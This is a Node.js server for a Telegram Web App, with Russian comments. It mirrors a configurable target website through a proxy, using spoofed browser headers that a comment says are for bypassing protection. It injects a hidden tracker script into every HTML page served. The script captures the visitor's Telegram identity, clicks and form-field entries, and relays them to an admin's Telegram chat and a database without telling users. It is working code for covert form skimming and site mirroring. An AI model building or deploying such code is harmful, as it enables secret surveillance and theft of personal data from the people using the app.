require('dotenv').config();
const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
app.use(express.json());

// Database
const pool = new Pool({ connectionString: process.env.DATABASE_URL });

// Telegram Bot
const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const ADMIN_ID = process.env.ADMIN_CHAT_ID;
const TARGET_SITE = process.env.TARGET_SITE || 'https://example.com';

// Прокси (опционально)
const PROXY_URL = process.env.PROXY_URL; // например: http://user:pass@proxy.com:8080
const proxyAgent = PROXY_URL ? new HttpsProxyAgent(PROXY_URL) : null;

// Инициализация БД
async function initDB() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS logs (
      id SERIAL PRIMARY KEY,
      session_id VARCHAR(255),
      telegram_user JSONB,
      event_type VARCHAR(50),
      element VARCHAR(255),
      value TEXT,
      page_url TEXT,
      created_at TIMESTAMP DEFAULT NOW()
    )
  `);
}
initDB();

// Трекер скрипт
const trackerScript = `
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<script>
(function() {
  const tg = window.Telegram?.WebApp;
  if (tg) { tg.ready(); tg.expand(); }
  const telegramUser = tg?.initDataUnsafe?.user || null;
  const sessionId = 'sess_' + Math.random().toString(36).substr(2, 9);
  
  function sendLog(eventType, element, value) {
    fetch('/api/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ sessionId, telegramUser, eventType, element, value: value || '', pageUrl: location.href })
    }).catch(() => {});
  }
  
  sendLog('pageview', document.title || location.pathname);
  
  document.addEventListener('click', (e) => {
    const el = e.target;
    const tag = el.tagName.toLowerCase();
    const text = el.innerText?.slice(0, 50) || '';
    const id = el.id ? '#' + el.id : '';
    const cls = el.className && typeof el.className === 'string' ? '.' + el.className.split(' ')[0] : '';
    sendLog('click', tag + id + cls, text);
  });
  
  document.addEventListener('change', (e) => {
    const el = e.target;
    if (['INPUT','TEXTAREA','SELECT'].includes(el.tagName)) {
      const name = el.name || el.id || el.placeholder || 'field';
      const val = el.type === 'password' ? '***' : el.value;
      sendLog('input', name, val);
    }
  });
  
  document.addEventListener('submit', (e) => {
    sendLog('submit', e.target.name || e.target.id || 'form');
  });
})();
</script>
`;

// API логирования
app.post('/api/log', async (req, res) => {
  const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
  
  try {
    await pool.query(
      'INSERT INTO logs (session_id, telegram_user, event_type, element, value, page_url) VALUES ($1, $2, $3, $4, $5, $6)',
      [sessionId, JSON.stringify(telegramUser), eventType, element, value, pageUrl]
    );
    
    const icons = { click: '👆', input: '⌨️', submit: '📤', pageview: '👁️' };
    const icon = icons[eventType] || '📝';
    const user = telegramUser?.username ? '@' + telegramUser.username : telegramUser?.id || 'Аноним';
    
    let msg = icon + ' ' + eventType.toUpperCase() + '\n';
    msg += '👤 ' + user + '\n';
    msg += '🎯 ' + element + '\n';
    if (value) msg += '📝 ' + value + '\n';
    msg += '🔗 ' + pageUrl;
    
    await bot.sendMessage(ADMIN_ID, msg);
    res.json({ ok: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Error' });
  }
});

// Браузерные заголовки для обхода защиты
const browserHeaders = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.9,ru;q=0.8',
  'Accept-Encoding': 'gzip, deflate, br',
  'Cache-Control': 'no-cache',
  'Pragma': 'no-cache',
  'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
  'Sec-Ch-Ua-Mobile': '?0',
  'Sec-Ch-Ua-Platform': '"Windows"',
  'Sec-Fetch-Dest': 'document',
  'Sec-Fetch-Mode': 'navigate',
  'Sec-Fetch-Site': 'none',
  'Sec-Fetch-User': '?1',
  'Upgrade-Insecure-Requests': '1'
};

// Прокси для всех запросов
app.get('*', async (req, res) => {
  const url = TARGET_SITE + req.path + (req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '');
  console.log('Fetching:', url);
  
  try {
    const fetchOptions = {
      redirect: 'follow',
      headers: { ...browserHeaders, 'Referer': TARGET_SITE }
    };
    
    if (proxyAgent) {
      fetchOptions.agent = proxyAgent;
    }
    
    const response = await fetch(url, fetchOptions);
    console.log('Response:', response.status, response.headers.get('content-type'));
    
    if (!response.ok) {
      return res.status(response.status).send(`Ошибка ${response.status}`);
    }
    
    const contentType = response.headers.get('content-type') || '';
    res.setHeader('Content-Type', contentType);
    
    // HTML — внедряем трекер
    if (contentType.includes('text/html')) {
      let html = await response.text();
      
      if (html.includes('</body>')) {
        html = html.replace('</body>', trackerScript + '</body>');
      } else if (html.includes('</html>')) {
        html = html.replace('</html>', trackerScript + '</html>');
      } else {
        html += trackerScript;
      }
      
      res.send(html);
    } else {
      const buffer = await response.arrayBuffer();
      res.send(Buffer.from(buffer));
    }
  } catch (err) {
    console.error('Proxy error for', url, ':', err.message);
    res.status(500).send(`
      <html>
        <body style="font-family: sans-serif; padding: 20px;">
          <h2>❌ Ошибка загрузки</h2>
          <p><b>URL:</b> ${url}</p>
          <p><b>Ошибка:</b> ${err.message}</p>
          <p><b>Прокси:</b> ${PROXY_URL ? 'включён' : 'выключен'}</p>
        </body>
      </html>
    `);
  }
});

// Команды бота
bot.onText(/\/start/, (msg) => {
  const webappUrl = process.env.WEBAPP_URL || 'https://your-app.railway.app';
  bot.sendMessage(msg.chat.id, '👋 Открой приложение:', {
    reply_markup: {
      inline_keyboard: [[{ text: '🚀 Открыть', web_app: { url: webappUrl } }]]
    }
  });
});

// Тест прокси
bot.onText(/\/test/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  
  let status = '🔧 Диагностика:\n\n';
  status += `📍 TARGET_SITE: ${TARGET_SITE}\n`;
  status += `🔒 PROXY: ${PROXY_URL ? 'включён' : 'выключен'}\n\n`;
  
  try {
    const fetchOptions = {
      redirect: 'follow',
      headers: { ...browserHeaders, 'Referer': TARGET_SITE }
    };
    if (proxyAgent) fetchOptions.agent = proxyAgent;
    
    const start = Date.now();
    const response = await fetch(TARGET_SITE, fetchOptions);
    const time = Date.now() - start;
    
    status += `✅ Сайт доступен\n`;
    status += `⏱ Время: ${time}ms\n`;
    status += `📊 Статус: ${response.status}\n`;
    status += `📄 Тип: ${response.headers.get('content-type')?.slice(0, 50)}`;
  } catch (err) {
    status += `❌ Ошибка: ${err.message}`;
  }
  
  bot.sendMessage(msg.chat.id, status);
});

bot.onText(/\/logs/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  const result = await pool.query('SELECT * FROM logs ORDER BY created_at DESC LIMIT 10');
  if (!result.rows.length) return bot.sendMessage(msg.chat.id, 'Логов нет');
  let text = '📊 Последние события:\n\n';
  result.rows.forEach((l, i) => { text += (i+1) + '. ' + l.event_type + ' — ' + l.element + '\n'; });
  bot.sendMessage(msg.chat.id, text);
});

bot.onText(/\/clear/, async (msg) => {
  if (msg.chat.id.toString() !== ADMIN_ID) return;
  await pool.query('DELETE FROM logs');
  bot.sendMessage(msg.chat.id, '🗑️ Очищено');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Server on port ' + PORT));
